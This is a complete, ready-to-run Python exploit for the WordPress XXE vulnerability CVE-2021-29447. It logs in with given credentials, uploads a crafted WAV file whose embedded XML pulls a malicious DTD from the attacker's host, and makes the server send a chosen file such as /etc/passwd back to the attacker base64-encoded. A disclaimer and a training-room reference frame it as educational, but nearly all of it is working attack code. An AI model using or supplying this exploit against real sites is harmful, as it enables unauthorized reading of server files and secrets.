#! /usr/bin/env python3

#### Title: Exploit Read File - WordPress XXE Vuln Authenticated
#### Author: 0xEtern4lW0lf
#### Created: 29 Dez 2022
#### Description: This exploits the WordPress XXE vulnerability. Allow read server files.
#### CVE-2021-29447
#### Refer: https://tryhackme.com/room/wordpresscve202129447

#### ========= MODULES =========

# python server
import subprocess, sys, os

# http lib
import requests

import argparse
import base64
import time
import re


#### ========= VARIABLE =========

#### COLORS ####
RED = "\033[1;91m"
YELLOW = "\033[1;93m"
BLUE = "\033[1;94m"
GREEN = "\033[1;92m"
END = "\033[1;m"

## Set proxy [OPTIONAL]
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

#### ========= FUNCTION =========

## Banner
def banner():
  EwLogo = f"""

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⣀⠠⠤⢤⣤⣶⣴⣦⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⡞⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⢿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣄⠈⠉⠛⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡯⣿⣷⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠰⢾⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢌⡻⢿⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠝⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡌⠿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠋⠀⣸⣧⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡄⠁
⠀⠀⠀⠀⠀⠀⠀⢀⣾⣏⣴⠟⢻⣿⠟⠛⠶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢻⣿⡀
⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣴⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⢳⣜⣿⡇
⠀⠀⠀⠀⠀⣠⣾⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⢿⣿⡇
⠀⠀⢀⣤⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠸⣿⠇
⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⣀⣤⣶⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⢸⣿⡄⡿⠀
⢺⣿⡏⠀⠀⠀⠀⢀⣤⣾⣿⠿⠛⠋⠙⠻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡝⣦⠀⣸⣿⡧⠃⠀
⠀⠈⠉⠀⢠⣤⣶⣿⡿⠋⠀⠀⠀⠀⠀⡀⠈⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⣿⣷⣿⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⢀⡜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡆⠀⠀⣼⡇⣾⣿⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⢻⣿⣀⣾⣿⢡⣿⡿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⡿⢣⣿⣿⣿⣿⣣⡿⠋⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠀⠀⠀⠀⠀⣀⣠⣤⣴⣶⣿⠿⣋⣴⣿⣿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⡇⠀⢀⣠⣶⣿⣿⡿⠟⠋⠉⠐⠊⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣇⣴⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀{RED}#--------------------------------------------#
 _____  _                         ___  _  _    _  _____  _   __ 
|  ___|| |                       /   || || |  | ||  _  || | / _|
| |__  | |_   ___  _ __  _ __   / /| || || |  | || |/' || || |_ 
|  __| | __| / _ \| '__|| '_ \ / /_| || || |/\| ||  /| || ||  _|
| |___ | |_ |  __/| |   | | | |\___  || |\  /\  /\ |_/ /| || |  
\____/  \__| \___||_|   |_| |_|    |_/|_| \/  \/  \___/ |_||_|  
                                                                
#----------------------------------------------------------------# 
    
    Author: {GREEN}0xEtern4lW0lf{END}                           
    {RED}Site: {BLUE}https://0xetern4lw0lf.github.io/{END}

    FOR EDUCATIONAL PURPOSE ONLY.

  """
  return print(f'{BLUE}{EwLogo}{END}')

# Pretty loading wheel
def loading(spins):

    def spinning_cursor():
        while True:
            for cursor in '|/ -\\':
                yield cursor

    spinner = spinning_cursor()
    for _ in range(spins):
        sys.stdout.write(next(spinner))
        sys.stdout.flush()
        time.sleep(0.1)
        sys.stdout.write('\b')



def argument_parser():
    """Parse argument provided to the script."""
    parser = argparse.ArgumentParser(description='WordPress CVE-2021-29447 Authenticated Exploit')

    parser.add_argument("-l", "--lhost",
                        required=True,
                        type=str,
                        help="Local IP")

    parser.add_argument("-lp", "--lport",
                        required=True,
                        type=int,
                        help="Local Port")

    parser.add_argument("-t", "--target",
                        required=True,
                        type=str,
                        help="Target WordPress URL, eg: http://XXXX.com")

    parser.add_argument("-f", "--file",
                        type=str,
                        help="File read, eg: /etc/passwd")

    parser.add_argument("-u", "--user",
                        required=True,
                        type=str,
                        help="Username used for WordPress authentication")

    parser.add_argument("-p", "--password",
                        required=True,
                        type=str,
                        help="Password used for WordPress authentication")
    
    args = parser.parse_args()

    return args





############## Weaponization ##############

############## PYTHON SERVER ##############

"""Start Python WebServer locally on port specified."""
def start_python_server(lport):
    python_server = subprocess.Popen([sys.executable, "-m", "http.server", str(lport)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

    os.set_blocking(python_server.stdout.fileno(), False)

    print(f"\n{BLUE}[+] PYTHON SERVER: {YELLOW}Python Server start in port {GREEN}{lport} {BLUE}[+]{END}")

    return python_server
    

"""Stop Python WebServer."""  
def stop_python_server(python_server):
    python_server.terminate()

    print(f"\n{BLUE}[+] PYTHON SERVER: {YELLOW}Python Server Stopped {BLUE}[+]{END}")

############## ============== ##############




############## PAYLOADS ##############

def createEvilWAV(lhost, lport):
    """Generate malicious WAV payload."""
    payload = b"""RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://""" + f"{lhost}:{lport}".encode('utf-8') + b"""/malicious.dtd'>%remote;%init;%trick;]>\x00"""

    print(f"\n{BLUE}[+] PAYLOAD: {YELLOW}Payload file WAV created! {BLUE}[+]{END}")

    return payload


def createEvilDTD(lhost, lport, targetFile):
    """Generate malicious DTD payload and store it locally."""
    with open('malicious.dtd', 'w') as file:
        file.write(f"""<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={targetFile}">\n""")
        file.write(f"""<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://{lhost}:{lport}/?p=%file;'>" >""")

    print(f"{BLUE}[+] PAYLOAD: {YELLOW}Payload file DTD created! {BLUE}[+]{END}")

############## ======= ##############




################# Attack #################


def loginWP(rhost, user, password):
    """Check authenticated connection to WordPress server ."""

    data = {
      'log': user,
      'pwd': password,
      'wp-submit': "Log+In",
      'redirect_to': rhost + "/wp-admin/",
      'testcookie': 1
    }

    r = requests.post(f"{rhost}/wp-login.php", data=data)


    if r.status_code == 200:
        print(f"\n{BLUE}[+] LOGIN WP: {YELLOW}WordPress Logged {GREEN}SUCCESSFULLY! {BLUE}[+]{END}")

    return r.cookies




def sendPayload(rhost, cookies, payload):
    """Retrieve _wpnonce from WordPress."""

    r = requests.get(f'{rhost}/wp-admin/media-new.php', cookies=cookies, proxies=proxies)

    wp_nonce = re.findall(r'name="_wpnonce" value="(\w+)"', r.text)[0]


    """Upload payload to WorPress vulnerable media feature."""
    file_data = {'async-upload': ('malicious.wav', payload)}

    data = {
        'name': 'malicous.wav',
        'action': 'upload-attachment',
        '_wpnonce': wp_nonce
    }

    r = requests.post(f'{rhost}/wp-admin/async-upload.php', data=data, files=file_data, cookies=cookies)

    if r.status_code == 200:
        if r.json()['success']:
            print(f"\n{BLUE}[+] UPLOAD FILE: {YELLOW}File WAV upload SUCCESSFULLY! {BLUE}[+]{END}")


def readFile(python_server,targetFile):
    """Retrieve information and files from Python WebServer stdout."""
    payload_printed = False
    retrieved_file_printed = False
    printing_error = False

    for line in python_server.stdout.readlines():

        if re.search(r'^Traceback', line):
            printing_error = True

        if printing_error:
            print(line)
            continue

        if re.search(r'GET \/malicious\.dtd', line):
            if not payload_printed:
                payload_printed = True

        if re.search(r'\/\?p=', line):
            if not retrieved_file_printed:
                matched_file = re.search(r'\/\?p=(.+?)\s', line)
                if matched_file:
                    file = matched_file.group(1)
                    print(f"{BLUE}[+] READ FILE: {GREEN}{targetFile} {YELLOW}file content {BLUE}[+]{END}\n")
                    print(base64.b64decode(file).decode('utf-8'))
                retrieved_file_printed = True

    if payload_printed and not retrieved_file_printed:
        print(f"\n{BLUE}[+] ERROR: {RED}File not found on server or not permission to read it {BLUE}[+]{END}")

    if not payload_printed and not retrieved_file_printed:
        print(f"\n{BLUE}[+] ERROR: {RED}Error WAV payload not executed on WordPress {BLUE}[+]{END}")

    if printing_error:
        print(f"\n{BLUE}[+] ERROR: {RED}Exiting... {BLUE}[+]{END}")
        exit(1)




def clean_temporary_files():
    """Remove temporary file used by script (DTD payload)."""
    os.remove('malicious.dtd')




def main():

    args = argument_parser()
    lhost = args.lhost
    lport = args.lport
    rhost = args.target
    user = args.user
    password = args.password
    targetFile = args.file

    cookies = loginWP(rhost, user, password)
 
    python_server = start_python_server(lport)

    payload = createEvilWAV(lhost, lport)

    createEvilDTD(lhost, lport, targetFile)
    
    sendPayload(rhost, cookies, payload)
    
    time.sleep(2)

    readFile(python_server, targetFile)

    stop_python_server(python_server)


    clean_temporary_files()

#### EXECUTION

if __name__ == '__main__':
    banner()
    main()